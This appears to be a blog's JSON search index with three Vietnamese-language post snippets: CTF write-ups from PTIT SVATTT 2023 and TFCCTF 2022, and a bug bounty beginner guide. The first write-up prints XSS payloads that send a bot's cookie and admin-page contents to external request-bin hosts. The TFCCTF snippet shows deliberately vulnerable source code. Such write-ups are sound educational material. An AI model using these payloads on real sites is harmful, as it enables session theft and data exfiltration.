[ { "title": "Writeup CTF Tuy·ªÉn ch·ªçn SVATT PTIT 2023", "url": "/posts/PTIT-SVATTT-2023/", "categories": "Writeup, PTITSVATTT2023", "tags": "ctf, writeup", "date": "2023-03-28 11:00:00 +0800", "snippet": "Writeup CTF Tuy·ªÉn ch·ªçn SVATT PTIT 2023Web01Ch√∫ng ta ƒë∆∞·ª£c cho 2 link, 1 l√† link challenge, 2 l√† link c·ªßa con bot. Kinh nghi·ªám cho m√¨nh th·∫•y ƒë√¢y l√† 1 b√†i Reflected XSS ƒë·ªÉ l·∫•y cookieSau khi ƒëƒÉng k√Ω v√† ƒëƒÉng nh·∫≠p, ƒë√¢y l√† UI c·ªßa web challenge g·ªìm 1 form ƒë·ªÉ nh·∫≠p note, v√† note ƒë∆∞·ª£c nh·∫≠p s·∫Ω hi·ªÉn th·ªã ngay b√™n d∆∞·ªõiTest th·ª≠ v·ªõi payload ƒë∆°n gi·∫£n &lt;img src=x onerror=alert(1), nh·∫≠n th·∫•y trang web b·ªã l·ªói XSS.√ù t∆∞·ªüng b√¢y gi·ªù l√† khai th√°c Reflected XSS ƒë·ªÉ l·∫•y cookie c·ªßa bot. Payload ƒë·ªÉ l·∫•y cookie c·ªßa bot:&lt;img src=x onerror=\"this.src='https://eo4kqgjvne2o998.m.pipedream.net/?'+document.cookie; this.removeAttribute('onerror');\"&gt;Gi·∫£i th√≠ch payload: Javascript ƒë∆∞·ª£c th·ª±c thi s·∫Ω g·ª≠i GET HTTP request ƒë·∫øn URL requestbin k√®m v·ªõi cookie c·ªßa botSau khi g·ª≠i ƒë∆∞·ªùng link cho bot, m√£ Javascript ƒë∆∞·ª£c th·ª±c thi, l·∫•y ƒë∆∞·ª£c cookie c·ªßa botThay cookie c·ªßa ng∆∞·ªùi d√πng b·∫±ng Cookie c·ªßa bot, truy c·∫≠p admin panel ta s·∫Ω l·∫•y ƒë∆∞·ª£c flagWeb02UI c·ªßa challenge l√† 1 form searchForm search l√†m m√¨nh nghƒ© ngay ƒë·∫øn SQLi : D. Nh∆∞ng sau khi test th·ª≠ v·ªõi Burp Suite v√† sqlmap th√¨ m√¨nh kh√¥ng detect ƒë∆∞·ª£c SQLi xDdirsearch URL c·ªßa challenge, t√¨m ƒë∆∞·ª£c 1 endpoint th√∫ dz·ªã l√† /docker-compose.ymlTruy c·∫≠p 167.172.80.186:5000/docker-compose.yml l·∫•y ƒë∆∞·ª£c password v√†o mysql db : DChui v√†o db m√¨nh l·∫•y ƒë∆∞·ª£c flag xDWeb01-againV·∫´n l√† c√°i UI c·ªßa b√†i web01 tr∆∞·ªõcv·∫´n l√† con BOT c≈©Nh∆∞ng c√°i kh√°c ·ªü ƒë√¢y l√† kh√¥ng th·ªÉ d√πng Reflected XSS ƒë·ªÉ l·∫•y cookie c·ªßa bot do c√≥ flag http-only√ù t∆∞·ªüng c·ªßa m√¨nh l√† thay v√¨ l·∫•y cookie c·ªßa con bot ƒë·ªÉ v√†o ƒë∆∞·ª£c admin panel, gi·ªù m√¨nh s·∫Ω ƒëi·ªÅu khi·ªÉn con bot l·∫•y lu√¥n flag v·ªÅ cho m√¨nh : DPOC ƒë·ªÉ con bot truy c·∫≠p admin pannel v√† l·∫•y flag cho m√¨nh&lt;script&gt; var req = new XMLHttpRequest(); // Initializes the request object req.onload=reqListener; // Set the listener reqListener that is triggered when the response is ready var url=\"http://167.172.80.186:9999/admin.php\"; // Initializes the URL of the PHP info page req.withCredentials=true; // Send the cookie header req.open(\"GET\",url,false); // The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously req.send(); // Send the request function reqListener() { var req2=new XMLHttpRequest(); const sess=this.responseText.substring(this.responseText.indexOf(\"ATTT\")); req2.open(\"GET\",\"https://eoisvenotwsj688.m.pipedream.net/?data=\"+btoa(sess),false); req2.send() };&lt;/script&gt;ok, gi·∫£i th√≠ch qua 1 ch√∫t POCƒë·∫ßu ti√™n bot s·∫Ω truy c·∫≠p v√†o trang adminSau ƒë√≥ n√≥ s·∫Ω l·ªçc response ƒë·ªÉ l·∫•y ra flag theo format ATTT{.......}b∆∞·ªõc cu·ªëi n√≥ g·ª≠i flag ƒë·ªÉ server c·ªßa m√¨nh, m√£ h√≥a base64 ƒë·ªÉ tr√°nh vi·ªác request URL qu√° d√†iv√† boomv√† boom, againFor01Ok, challenge n√†y cho ch√∫ng ta 1 file rar, sau khi gi·∫£i n√©n c·∫•u tr√∫c th∆∞ m·ª•c s·∫Ω nh∆∞ th·∫ø n√†yT√≥m g·ªçn l·∫°i l√† c√≥ 100 th∆∞ m·ª•c ƒë∆∞·ª£c ƒë√°nh d·∫•u t·ª´ 0-100, trong m·ªói th∆∞ m·ª•c l·∫°i c√≥ 100 th∆∞ m·ª•c ƒë∆∞·ª£c ƒë·∫∑t t√™n t·ª´ 0-100. Trong m·ªói th∆∞ m·ª•c con l·∫°i c√≥ 100 file .txt 0.txt ƒë·∫øn 100.txt . Nhi·ªám v·ª• c·ªßa ch√∫ng ta l√† t√¨m ra flag trong ƒë·ªëng file .txt ƒë·∫•y : D. M√¨nh d√πng python ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t√¨m flag. ƒê√¢y l√† source code:import osfor i in range(0,101): for j in range(0,101): for filename in os.listdir('./{}/{}/'.format(i,j)): f = open('./{}/{}/'.format(i,j)+filename,'r') r = f.read() if r != \"almost\" and r != \"no\" and r!=\"nah\" and r!=\"you_got_it\" and r!=\"try_again\" and r!=\"Not_this_time\" and r!=\"so_close\" and r!=\"nope\" and r!=\"better_luck_next_time\": print(r)M√¨nh s·ª≠ d·ª•ng 2 v√≤ng l·∫∑p v√† ƒë·ªçc t·∫•t c·∫£ c√°c file .txt trong th∆∞ m·ª•c con, k·∫øt qu·∫£ t√¨m ra flag : DCrypto01Source code enc.cpp:#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;#define EL printf(\"\\n\")string flag = \"ATTT{fake_flag}\";void bases(string &amp;s) { for (int i = 0; i &lt; s.size(); i += 4) printf(\"%o %u %x %u \", (unsigned char) s[i], (unsigned char) s[i + 1], (unsigned char) s[i + 2], (unsigned char) s[i + 3]); EL;}int main() { freopen(\"res.txt\", \"w\", stdout); bases(flag); return 0;}Thu·∫≠t to√°n: L·∫•y 4 k√≠ t·ª± li·ªÅn nhau, k√≠ t·ª± ƒë·∫ßu ti√™n s·∫Ω chuy·ªÉn v·ªÅ d·∫°ng octal, k√≠ t·ª± th·ª© 2 l√† d·∫°ng decimal, k√≠ t·ª± th·ª© 3 l√† d·∫°ng hex v√† k√≠ t·ª± th·ª© 4 ti·∫øp t·ª•c l√† decimal, v√† l·∫∑p l·∫°i nh∆∞ v·∫≠y ƒë·∫øn khi h·∫øt chu·ªói.M√¨nh hi·ªÉu thu·∫≠t to√°n nh∆∞ng qu√™n m·∫•t c√°ch code c++, code python th√¨ l√∫ n√™n t·ª©c qu√° quay ra l√†m b·∫±ng tay xD. B·∫≠t 4 tab cyberchef v√† qu·∫©y t·∫ßm 2,3p m√¨nh ƒë∆∞·ª£c flag √°m ·∫£nh nh·∫•t m√¨nh t·ª´ng t√¨m ƒë∆∞·ª£c : D" }, { "title": "ƒê·ª´ng ch∆°i Bug bounty, ch·∫°y, ch·∫°y ngay ƒëi!!", "url": "/posts/Bugbounty/", "categories": "Blog", "tags": "bug_bounty", "date": "2022-08-11 13:00:00 +0800", "snippet": "Bug bounty l√† g√¨?MindsetMindset, hay c√°ch gi·ªØ cho t√¨nh th·∫ßn c·ªßa b·∫°n ·ªïn ƒë·ªãnh sau khi b·ªã duplicate v√† ti·∫øp t·ª•c g√µ c√°c programN·∫øu b·∫°n m·ªõi b·∫Øt ƒë·∫ßu CH∆†I bug bounty, n√™n x√°c ƒë·ªãnh tinh th·∫ßn tr∆∞·ªõc r·∫±ng s·∫Ω m·∫•t ( r·∫•t nhi·ªÅu ) th·ªùi gian ƒë·ªÉ c√≥ th·ªÉ CH∆†I ƒë∆∞·ª£c bug bounty ho·∫∑c l√† bug bounty s·∫Ω CH∆†I b·∫°n m·ªói ng√†y. B·∫°n s·∫Ω c·∫ßn c√≥ ki√™n nh·∫´n, quy·∫øt t√¢m v√† ƒëam m√™, ƒëam m√™, r·∫•t nhi·ªÅu ƒëam m√™ ( ƒêi·ªÅu quan tr·ªçng nh·∫Øc l·∫°i 3 l·∫ßn ). ƒê√¢y l√† m·ªôt lƒ©nh v·ª±c c·ª±c k·ª≥ c·∫°nh tranh, ƒë√≤i h·ªèi ƒëam m√™, chƒÉm ch·ªâ, t∆∞ duy t·ªët ƒë·ªÉ c√≥ th·ªÉ duy tr√¨ v√† ph√°t tri·ªÉn ƒë∆∞·ª£c. ƒê·ªëi v·ªõi m·ªôt s·ªë ng∆∞·ªùi, qu√° tr√¨nh t√¨m bug bounty c√≥ th·ªÉ b·∫Øt ƒë·∫ßu r·∫•t ch·∫≠m v√† c≈©ng c√≥ nh·ªØng ng∆∞·ªùi t√¨m ra l·ªói ngay sau khi b·∫Øt ƒë·∫ßu. M·ªôt ƒëi·ªÅu quan tr·ªçng c·∫ßn nh·ªõ khi t√¨m bug bounty l√† ƒë·ª´ng ch√°n n·∫£n, kh√≥ ch·ªãu n·∫øu b·∫°n m·∫•t nhi·ªÅu th·ªùi gian h∆°n ƒë·ªÉ t√¨m th·∫•y l·ªói h·ª£p l·ªá. Kh√¥ng ph·∫£i ai c≈©ng t√¨m th·∫•y l·ªói m·ªói khi h·ªç ng·ªìi xu·ªëng v√† hack. Vi·ªác t√¨m ra l·ªói r·∫•t ph·ªï bi·∫øn trong nhi·ªÅu ng√†y, v√†i tu·∫ßn ho·∫∑c th·∫≠m ch√≠ v√†i th√°ng.¬†ƒê·ª´ng so s√°nh th√†nh c√¥ng hay th·∫•t b·∫°i c·ªßa ch√≠nh b·∫°n v·ªõi ng∆∞·ªùi kh√°c.¬†B·ªüi v√¨ c≈©ng nh∆∞ b·∫•t c·ª© ƒëi·ªÅu g√¨ kh√°c, s·∫Ω lu√¥n c√≥ ng∆∞·ªùi t·ªët h∆°n b·∫°n v√† ng∆∞·ªùi kh√°c k√©m h∆°n b·∫°n.¬†V√¨ v·∫≠y, ƒë·∫∑t ra c√°c m·ª•c ti√™u c·ªßa ri√™ng b·∫°n v√† l√†m vi·ªác ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c ch√∫ng c√≥ th·ªÉ r·∫•t quan tr·ªçng. ( Tommy ‚Äúdawgyg‚Äù DeVoss )Ngo√†i l√†m suy s·ª•p tinh th·∫ßn c·ªßa m·ªôt s·ªë ng∆∞·ªùi th√¨ b√†i h·ªçc v√† ki·∫øn th·ª©c l√† ph·∫ßn th∆∞·ªüng duy nh·∫•t m√† b·∫°n s·∫Ω lu√¥n nh·∫≠n ƒë∆∞·ª£c v√† n·∫±m trong t·∫ßm ki·ªÉm so√°t c·ªßa b·∫°n. V√¨ v·∫≠y, n·∫øu b·∫°n l√† ng∆∞·ªùi m·ªõi b·∫Øt ƒë·∫ßu, b·∫°n n√™n ƒë·∫∑t m·ª•c ti√™u t√¨m hi·ªÉu v·ªÅ c√°c l·ªó h·ªïng v√† k·ªπ thu·∫≠t khai th√°c ch√∫ng h∆°n l√† ki·∫øm ƒë∆∞·ª£c bao nhi√™u ti·ªÅn.H·ªçc g√¨ ƒë·ªÉ CH∆†IN√≥i chung l√† r·∫•t nhi·ªÅu th·ª© c·∫ßn h·ªçc, v√† vi·ªác h·ªçc l√† vi·ªác c·∫£ ƒë·ªùi v√¨ ƒë·∫∑c th√π c·ªßa ng√†nh: M·ªçi th·ª© ƒëang thay ƒë·ªïi t·ª´ng gi√¢y, ng·ªß d·∫≠y c√°i c≈©ng c√≥ th·ªÉ th√†nh ng∆∞·ªùi t·ªëi c·ªï ngay, ƒëi t√π hay b·ªã bƒÉt c√≥c ch·ª•c nƒÉm th√¨ m√¨nh kh√¥ng bi·∫øt ¬Ø_(„ÉÑ)_/¬Ø. B√†i n√†y m√¨nh ch·ªâ t·∫≠p trung v√†o h·ªçc g√¨ ƒë·ªÉ sƒÉn bug bounty tr√™n c√°c web application.Ki·∫øn th·ª©c ·ª©ng d·ª•ng web c∆° b·∫£n C√°ch request ho·∫°t ƒë·ªông HTTP headers JSON requests C√°ch browser ho·∫°t ƒë·ªông C√°ch ·ª©ng d·ª•ng giao ti·∫øp v√† g·ª≠i d·ªØ li·ªáu v·ªõi serverNh·ªØng l·ªó h·ªïng ph·ªï bi·∫øn ( Top 10 OWASP)B·∫°n s·∫Ω c·∫ßn hi·ªÉu r√µ v·ªÅ nguy√™n nh√¢n t·ªìn t·∫°i (do sai s√≥t g√¨, trong c√°c ch·ª©c nƒÉng n√†o), c√°ch khai th√°c, ngƒÉn ch·∫∑n/gi·∫£m thi·ªÉu [bi·∫øt c√°ch ngƒÉn ch·∫∑n s·∫Ω nghƒ© ra c√°ch bypass ( Õ†¬∞ Õü ñ Õ°¬∞) ] nh·ªØng l·ªó h·ªïng ph·ªï bi·∫øn nh∆∞ Remote Code Execution (RCE), Cross Site Request Forgery (CSRF), Cross Site Scripting (XSS), Injeciton (SQL injeciton, Command injection, ‚Ä¶ ), ‚Ä¶. B·∫£n th√¢n m√¨nh khuy√™n t√¨m hi·ªÉu t·ª´ng l·ªó h·ªïng, t√°i hi·ªán l·∫°i l·ªó h·ªïng v√† c√°ch khai th√°c l·ªó h·ªïng.Read blogs.¬†Learn new techniques from other bug bounty hunters so that you can test it out during your testing. If you are new to Bug Bounty program, you might not feel confident that you can find something a public program. This is something that a lot of hackers are struggling with. If you haven‚Äôt found a lot of security vulnerabilities yet, it might payoff to practice on Capture The Flag (CTF). Exploiting something for the first time is difficult and eye-opening. Apply the same structure if you would apply when looking in real targets as this help you a build a solid foundation and will help you to become an amazing hacker. Use bug bounty as a way to expand your knowledge and not as a race. Write simple scripts and use available tools to expand the process of expanding attack surface [‚Ä¶] Understand the web application and figure out what assets the web application are trying to protect. Think like an engineer of the web application. (Jobert Abma, Hackerone Cofounder)ƒê·ªçc blog: H·ªçc nh·ªØng c√¥ng ngh·ªá m·ªõi t·ª´ nh·ªØng bug bounty huntrer kh√°c, t·ª´ ƒë√≥ c√≥ th·ªÉ √°p d·ª•ng v√†o ch√≠nh ch∆∞∆°ng tr√¨nh, d·ª± √°n c·ªßa m√¨nh. B·∫£n th√¢n m√¨nh ƒë·ªçc bounty writeup c·ªßa ng∆∞·ªùi kh√°c r·∫•t nhi·ªÅu, c·ªë g·∫Øng suy nghƒ© v√† sao ch√©p mindset c·ªßa h·ªç ( Õ†¬∞ Õü ñ Õ°¬∞), nghƒ© xem t·∫°i sao h·ªç t√¨m th·∫•y l·ªói ƒë·∫•y m√† m√¨nh kh√¥ng t√¨m ƒë∆∞·ª£c :(. M·ªói khi th·∫•y 1 l·ªói th√∫ v·ªã, m√¨nh th∆∞·ªùng th·ª≠ √°p d·ª•ng v√†o c√°c target hi·ªán t·∫°i c·ªßa m√¨nh. N·∫øu b·∫°n l√† m·ªôt ng∆∞·ªùi m·ªõi, m√¨nh khuy√™n b·∫°n n√™n ch∆°i CTF ( t·∫•t nhi√™n l√† ƒë·ª´ng ƒë·ªÉ CTF ch∆°i b·∫°n ). Ch∆°i CTF c√≥ th·ªÉ gi√∫p b·∫°n luy·ªán t·∫≠p ph·∫£n x·∫°, n√¢ng ‚Äúsense‚Äù c·ªßa m√¨nh l√™n ( c√°ch ti·∫øp c·∫≠n target, t√≠nh nƒÉng n√†o th∆∞·ªùng b·ªã l·ªó h·ªïng n√†o )H·ªçc c√°ch t·∫°o ra m·ªôt trang web/·ª©ng d·ª•ng: B·∫°n c·∫ßn bi·∫øt c√°ch m√† m·ªôt ·ª©ng d·ª•ng web ƒë∆∞·ª£c t·∫°o ra tr∆∞·ªõc, sau khi ƒë√£ hi·ªÉu c√°ch m√† m·ªçi th·ª© ƒë∆∞·ª£c t·∫°o ra v√† ho·∫°t ƒë·ªông, b·∫°n s·∫Ω t√¨m ra c√°ch ƒë·ªÉ khai th√°c c≈©ng nh∆∞ c√°ch ph√≤ng ch·ªëng, t·ª´ c√°ch ph√≤ng ch·ªëng l·∫°i nghƒ© ra c√°ch bypass ( Õ†¬∞ Õü ñ Õ°¬∞).Ph∆∞∆°ng ph√°p CH∆†IPick targetT√¨m m·ªôt target ngon s·∫Ω ph·ª• thu·ªôc v√†o nh·ªØng y·∫øu t·ªë sau:Ng√†y c√¥ng b·ªë ch∆∞∆°ng tr√¨nhN√™n t·∫≠p trung v√†o nh·ªØng ch∆∞∆°ng tr√¨nh m·ªõi ƒë∆∞·ª£c c√¥ng b·ªë, thay v√¨ nh·ªØng ch∆∞∆°ng tr√¨nh c≈© ƒë√£ ƒë∆∞·ª£c c√°c bounty hunter kh√°c v·ªçc n√°t r·ªìi :^. Th·ªânh tho·∫£ng m√¨nh v·∫´n ch·ªçn program c≈© v√¨ ai c≈©ng nghƒ© n√≥ c≈© n√™n kh√¥ng ƒë·ª•ng v√†o =))) v√¨ m·ªôt s·ªë y·∫øu t·ªë n·ªØa m√† m√¨nh s·∫Ω ƒë·ªÅ c·∫≠p ngay d∆∞·ªõiPh·∫£n h·ªìiTh·ªùi gian ph·∫£n h·ªìi v√† c√°ch ph·∫£n h·ªìi c≈©ng l√† m·ªôt ti√™u ch√≠ ƒë·ªÉ m√¨nh ƒë√°nh gi√° ch∆∞∆°ng tr√¨nh c√≥ th∆°m hay kh√¥ng =)). N·∫øu m·ªôt ch∆∞∆°ng tr√¨nh ph·∫£n h·ªìi ch·∫≠m hay thi·∫øu chuy√™n nghi·ªáp, ‚Äúl∆∞∆°n l·∫πo‚Äù gi·∫£m impact v√¥ l√Ω th√¨ m√¨nh s·∫Ω skip. Th∆∞·ªùng th√¨ m√¨nh s·∫Ω ‚Äúth·ª≠ l·ª≠a‚Äù b·∫±ng c√°ch submit 1 l·ªói P5 ƒë·ªÉ xem th·ªùi gian ph·∫£n h·ªìi v√† c√°ch h·ªç ph·∫£n h·ªìi ra sao ƒë·ªÉ quy·∫øt ƒë·ªãnh c√≥ n√™n theo v√† ƒë√†o s√¢u target h∆°n kh√¥ng.Scope (Ph·∫°m vi c·ªßa ch∆∞∆°ng tr√¨nh)Ph·∫°m vi c·ªßa ch∆∞∆°ng tr√¨nh c√†ng l·ªõn c√†ng tƒÉng kh·∫£ nƒÉng l·ªói kh√¥ng b·ªã duplicateB·∫°n c√≥ c·∫£m th·∫•y h·ª©ng th√∫ v·ªõi program ƒë√≥ kh√¥ng?V·ªõi m√¨nh, ƒë√¢y l√† c√°i quan tr·ªçng nh·∫•t. Vi·ªác b·∫°n h·ª©ng th√∫ hay kh√¥ng s·∫Ω ·∫£nh h∆∞·ªüng r·∫•t l·ªõn ƒë·∫øn nƒÉng su·∫•t l√†m vi·ªác c·ªßa b·∫°n, khi h·ª©ng th√∫ th√¨ b·∫°n s·∫Ω ƒë·∫ßu t∆∞ th·ªùi gian v√† t√¢m huy·∫øt v·ªõi n√≥. V·∫≠y n√™n ƒë·ª´ng c·ªë g·∫Øng √¥m m·ªôt c√°i program m√† b·∫°n kh√¥ng y√™u, ƒëau kh·ªï l·∫Øm üíîTi·ªÅn th∆∞·ªüngC√°i n√†y th√¨ t√πy m·ªói ng∆∞·ªùi, ai l√†m v√¨ ƒëam m√™ th√¨ skip nh√© =)))))). Ti·ªÅn th∆∞·ªüng l·ªói c≈©ng n√™n l√† m·ªôt ti√™u ch√≠ ƒë·ªÉ b·∫°n quy·∫øt ƒë·ªãnh g√µ n√≥ hay kh√¥ng. Kh√¥ng ai mu·ªën t√¨m sml ra 1 c√°i P1 ƒë∆∞·ª£c tr·∫£ ti·ªÅn b·∫±ng c√°i P3 ·ªü program kh√°c, factos ( Õ†¬∞ Õü ñ Õ°¬∞)C√°ch ti·∫øp c·∫≠n m·ªôt targetC√°ch m√† m√¨nh ti·∫øp c·∫≠n v√† recon m·ªôt em h√†ng ng·ªçt n∆∞·ªõc. C√°i n√†y ch·ªâ ƒë·ªÉ tham kh·∫£o th√¥i (v√† m√¨nh c≈©ng mu·ªën chia s·∫ª n·ªØa :3 ), v√¨ c√≥ n+1 c√°ch ( n thu·ªôc N*) kh√°cM√¨nh s·∫Ω l·∫•y m·ªôt program l√†m v√≠ d·ª• ƒë·ªÉ d·ªÖ h√¨nh dung c√°ch m√¨nh recon h∆°n. ƒê√¢y c≈©ng l√† d·∫°ng program m√† m√¨nh th√≠ch ( nhi·ªÅu n∆∞·ªõc, l·ªôn, nhi·ªÅu subdomain )Sau khi ƒë·ªçc qua ph·∫ßn Ch√≠nh s√°ch, Out-of-scope th√¨ m√¨nh s·∫Ω ng√≥ qua Scope, Scope nhi·ªÅu th·∫ø n√†y th√¨ ph·∫£i v·ª•t. ( program n√†y l√† VDP, n√¥m na l√† s·∫Ω kh√¥ng c√≥ ti·ªÅn, nh∆∞ng n·∫øu b·∫°n m·ªõi tham gia bug bounty th√¨ c·ª© th·ª≠ v√† t·∫≠n h∆∞·ªüng c·∫£m gi√°c duplicate ƒëi )Kh√¥ng l√≤ng v√≤ng n·ªØa, ƒë·∫ßu ti√™n khi th·∫•y m·ªôt ƒë·ªëng subdomain th·∫ø n√†y, m√¨nh s·∫Ω d√πng amass ƒë·ªÉ li·ªát k√™ to√†n b·ªô subdomain, v√† d√πng httpx ƒë·ªÉ check xem subdomain n√†o c√≤n s·ªëngamass enum -d domain | httpx -title -status-codeK√≠ t·ª± ‚Äú|‚Äù ƒë·ªÉ m√¨nh chain 2 c√¢u l·ªánh v·ªõi nhau, ƒë·∫°i kh√°i n√≥ s·∫Ω l·∫•y ƒë·∫ßu ra c√¢u l·ªánh tr∆∞·ªõc l√†m ƒë·∫ßu v√†o cho c√¢u l·ªánh ti·∫øp theo, mu·ªën hi·ªÉu r√µ h∆°n th√¨ b·∫°n n√™n l√†m 1 kh√≥a linux c∆° b·∫£n :^Sau khi c√≥ list c√°c subdomain c√≤n s·ªëng, m√¨nh s·∫Ω ƒëi s√¢u v√†o t·ª´ng subdomain 1: Xem qua c√°c c√¥ng ngh·ªá m√† trang web ƒëang s·ª≠ d·ª•ng Google dorking Dirsearch/ffuf S·ª≠ d·ª•ng JSFinder ƒë·ªÉ ki·ªÉm tra xem c√≥ th√¥ng tin nh·∫°y c·∫£m b·ªã l·ªô kh√¥ng R√† qu√©t trang web s·ª≠ d·ª•ng Nuclei Li·ªát k√™ c√°c endpoint, ch·ª©c nƒÉng c·ªßa trang web, hi·ªÉu r√µ nghi·ªáp v·ª• c·ªßa t·ª´ng ch·ª©c nƒÉng. D·∫°o g·∫ßn ƒë√¢y m√¨nh hay s·ª≠ d·ª•ng gau (get all url) ƒë·ªÉ list ra c√°c url c·ªßa trang web.Well, s∆° s∆° c≈©ng ch·ªâ v·∫≠y th√¥i, c√≤n ƒëi s√¢u v√†o t·ª´ng ch·ª©c nƒÉng th√¨ test theo check list, ho·∫∑c l√†m nhi·ªÅu b·∫°n s·∫Ω t·ª± bi·∫øt ch·ª©c nƒÉng n√†o th∆∞·ªùng hay d√≠nh l·ªói n√†o¬Ø_( Õ°¬∞ Õú ñ Õ°¬∞)_/¬ØFocus v√†o c√°i g√¨ ?C√°i n√†y c·∫ßn c√¢u c∆°m n√™n m√¨nh kh√¥ng share ƒë√¢u üêßTipsGitlab ∆Øu ti√™n nh·ªØng l·ªói nghi√™m tr·ªçng (P1) Kh√¥ng ai mu·ªën d√†nh nhi·ªÅu th·ªùi gian ƒë·ªÉ ph√¢n t√≠ch nh·ªØng l·ªói Low L·∫Øng nghe, xem x√©t ph·∫£n h·ªìi c·ªßa c√°c b√™n li√™n quan, ƒë√¥i l√∫c n√≥ c√≥ th·ªÉ gi√∫p √≠ch M√¨nh t·ª´ng t√¨m ƒë∆∞·ª£c 1 l·ªói P5, v√† √¥ng verify ƒë√£ rep l·∫°i kh√° nhi·ªát t√¨nh, g·ª£i √Ω cho m√¨nh c√°c attack vector ƒë·ªÉ c√≥ th·ªÉ n√¢ng impact c·ªßa l·ªó h·ªïng l√™n S·ª≠ d·ª•ng c√¥ng c·ª• t·ª± ƒë·ªông h√≥a ( B·∫£n th√¢n m√¨nh kh√¥ng khuy·∫øn kh√≠ch, c√¥ng c·ª• ai c≈©ng c√≥ th·ªÉ d√πng v√† qu√©t ra ƒë∆∞·ª£c )Portswigger Hi·ªÉu quy tr√¨nh, nghi·ªáp v·ª• c·ªßa m·ª•c ti√™u T·∫≠p trung v√†o 1 lo·∫°i l·ªó h·ªïng c·ª• th·ªÉ ( V√† ki·ªÉm tra l·∫ßn l∆∞·ª£t t·ª´ng lo·∫°i l·ªó h·ªïng ) ƒê·ªçc c√°c writeup, report v·ªÅ lo·∫°i l·ªó h·ªïng ƒë√≥ T·∫≠p trung v√†o t√¨m lo·∫°i l·ªó h·ªïng n√†y tr√™n m·ª•c ti√™u c·ªßa b·∫°n L√†m quen v·ªõi ·ª©ng d·ª•ng, hi·ªÉu ƒë∆∞·ª£c nghi·ªáp v·ª•, lu·ªìng, t√≠nh nƒÉng c·ªßa ·ª©ng d·ª•ng T·∫≠p trung t√¨m hi·ªÉu c√°ch m·ªçi th·ª© ho·∫°t ƒë·ªông thay v√¨ ch·∫°y c√°c c√¥ng c·ª• t·ª± ƒë·ªông T√¨m l·ªó h·ªïng ·ªü nh·ªØng v·ªã tr√≠ ch∆∞a c√≥/√≠t ng∆∞·ªùi quan t√¢m Ch·ªçn 1 program c≈©, bounty nh·ªè Program c√≥ scope r·ªông ( nhi·ªÅu subdomain, domain ) Kh√¥ng ng·ª´ng h·ªçc h·ªèi ( ƒê·ªçc writeup, bug bounty report, blog, ph√¢n t√≠ch 1-day, ‚Ä¶ ) Ki·ªÉm tra c√°c attack vector kh√¥ng ph·ªï bi·∫øn Th·ª±c hi·ªán c√°c h√†nh ƒë·ªông kh√¥ng mong mu·ªën (kh√¥ng g·ª≠i nh·ªØng g√¨ ·ª©ng d·ª•ng, ng∆∞·ªùi ph√°t tri·ªÉn mong mu·ªën ) Thay v√†o ƒë√≥, nghƒ© v·ªÅ nh·ªØng ƒëi·ªÅu m√† m·∫•y √¥ng dev kh√¥ng nghƒ© ƒë·∫øn, kh√¥ng xem x√©t, b·ªè s√≥t.Zwink Coi Bug bounty nh∆∞ 1 game nh·∫≠p vai ( nghe h∆°i ·∫£o game nh∆∞ng theo m√¨nh hi·ªÉu √Ω c·ªßa Zwink l√† enjoy n√≥, v√¨ b·∫±ng c√°ch n√†y hay c√°ch kh√°c, n√≥ s·∫Ω up level c·ªßa b·∫°n, v√† ƒë·ª´ng bu·ªìn khi b·ªã dup :)) N√≥ l√† ƒëi·ªÅu t·∫•t y·∫øu, b·∫°n kh√¥ng b·ªã dup th√¨ t√¥i b·ªã dup, v√† ng∆∞·ª£c l·∫°i. Lu√¥n c√≥ ng∆∞·ªùi b·ªã dup :)) ) H·ªçc tr√™n Portswigger Academy v√† t√¨m hi·ªÉu v·ªÅ c√°c l·ªó h·ªïng h·ªá th·ªëng ph√¢n lo·∫°i l·ªó h·ªïng c·ªßa BugCrowd (BugCrowd VRT) Ki·∫øm l·ªó h·ªïng valid ƒë·∫ßu ti√™n ( P4 c≈©ng ·ªïn, P3, P2, P1 th√¨ c√†ng ok ) Quan tr·ªçng l√† n√≥ s·∫Ω gi√∫p b·∫°n c√≥ th√™m ƒë·ªông l·ª±c, c√≥ th√™m c∆° h·ªôi ƒë∆∞·ª£c m·ªùi v√†o private program ( ƒë·ª° c·∫°nh tranh h∆°n ) Test tay ƒë·ªÉ tr√°nh b·ªã tr√πng l·ªó h·ªïng, s·ª≠ d·ª•ng VPN ph√≤ng tr∆∞·ªùng h·ª£p b·ªã firewall block Sau khi quen r·ªìi th√¨ t·∫≠p trung v√†o t√¨m c√°c l·ªó h·ªïng ·ªü m·ª©c cao h∆°nT√†i nguy√™nM·ªôt b√†i m√¨nh th·∫•y t·ªïng h·ª£p kh√° ƒë·ªß:Gold Bug Bounty Resources in 2022Youtube (N√≥i chung t√πy ng∆∞·ªùi, b·∫°n th·∫•y h·ª£p ai th√¨ xem ng∆∞·ªùi ƒë√≥) LiveOverflow Bugcrowd InsiderPhD Nahamsec ST√ñK SecurityIdiots Z-winK University (ZU) - Bug Bounty Education Hack ‚ÄòEm All John Hammond CyberJutsuTVC∆°m th√™mhttps://github.com/bobby-lin/study-bug-bounty" }, { "title": "Are you the admin? TFCCTF 2022", "url": "/posts/RUTheAdmin-TFCCTF2022/", "categories": "Writeup, TFCCTF 2022", "tags": "web, writeup", "date": "2022-08-02 08:00:00 +0800", "snippet": "ARE YOU THE ADMIN? - TFCCTF2022Source code ƒëi k√®mschema.prismagenerator client { provider = \"prisma-client-js\"}datasource db { provider = \"sqlite\" url = \"file:./app.db\"}model User { id String @id @default(uuid()) username String isAdmin Boolean @default(false)}auth.tsimport { NextApiRequest, NextApiResponse } from \"next\";import { prisma } from \"../../globals/prisma\";export default async function handler( req: NextApiRequest, res: NextApiResponse) { const body = req.body; await prisma.user.create({ data: body, }); return res.status(200).end();}index.tsximport type { GetServerSideProps, NextPage } from \"next\";import type { User } from \"@prisma/client\";import { prisma } from \"../globals/prisma\";import { useState } from \"react\";import { useRouter } from \"next/router\";type Props = { users: (User &amp; ( | { flag: string; isAdmin: true; } | { flag?: never; isAdmin: false; } ))[];};const Home: NextPage&lt;Props&gt; = ({ users }) =&gt; { const [username, setUsername] = useState(\"\"); const router = useRouter(); const create = async () =&gt; { await fetch(\"/api/auth\", { headers: { \"Content-Type\": \"application/json\", }, method: \"POST\", body: JSON.stringify({ username, }), }); await router.replace(router.asPath); }; return ( &lt;div&gt; &lt;div&gt;Create user:&lt;/div&gt; &lt;input value={username} onChange={(event) =&gt; 